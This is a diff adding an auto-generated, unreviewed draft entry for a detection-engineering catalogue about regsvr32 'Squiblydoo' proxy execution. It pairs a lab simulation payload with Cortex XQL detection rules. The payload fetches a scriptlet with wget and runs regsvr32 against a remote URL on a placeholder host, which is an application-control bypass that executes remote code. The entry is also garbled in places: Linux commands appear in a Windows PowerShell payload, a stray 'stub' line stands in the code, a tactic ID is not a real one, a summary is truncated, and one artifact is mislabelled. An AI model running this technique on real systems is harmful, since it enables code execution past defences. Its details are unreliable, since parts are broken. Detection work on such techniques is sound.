@@ -1,0 +1,151 @@
+{
+  "id": "TTP-0000-0011",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "source-not-recorded"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Windows regsvr32 Squiblydoo Proxy Execution via COM Scriptlet",
+    "summary": "An attacker uses regsvr32 to execute a remote COM scriptlet (Squiblydoo technique) that bypasses application control by leveraging the /i:http://192.0.2.1/x.sct parameter. Cortex should detect the exe",
+    "description": "An attacker uses regsvr32 to execute a remote COM scriptlet (Squiblydoo technique) that bypasses application control by leveraging the /i:http://192.0.2.1/x.sct parameter. Cortex should detect the execution of regsvr32 with an HTTP URL and scrobj.dll."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1218",
+        "subtechnique_id": "T1218.010",
+        "name": "T1218.010",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      },
+      {
+        "technique_id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "mkdir -p /tmp/scratch\nwget -O /tmp/scratch/x.sct http://192.0.2.1/x.sct\nstub chmod +x /tmp/scratch/x.sct\nregsvr32 /s /n /u /i:http://192.0.2.1/x.sct scrobj.dll\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "regsvr32 process started with /i: parameter",
+        "expected_value": "action_process_image_name = 'regsvr32.exe'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound HTTP request to C2 server",
+        "expected_value": "action_remote_ip = '192.0.2.1'"
+      },
+      {
+        "artifact_type": "file",
+        "description": "COM scriptlet downloaded from remote URL",
+        "expected_value": "action_file_path = 'scrobj.dll'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Regsvr32 with Remote Scriptlet",
+        "description": "Detection of regsvr32 being invoked with /i: parameter pointing to an HTTP URL",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'regsvr32.exe'\n| filter action_process_command_line contains '/i:http://'\n| filter action_process_command_line contains 'scrobj.dll'",
+        "mitre_technique_ids": [
+          "T1218.010"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Regsvr32 Proxy Execution Hunt",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'regsvr32.exe'\n| filter action_process_command_line contains '/i:http://'\n| filter action_process_command_line contains 'scrobj.dll'\n| fields actor_process_image_name, action_process_command_line, agent_hostname",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": []
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "MITRE ATT&CK T1218.010",
+      "url": "https://attack.mitre.org/techniques/T1218/010/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1105",
+      "url": "https://attack.mitre.org/techniques/T1105/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
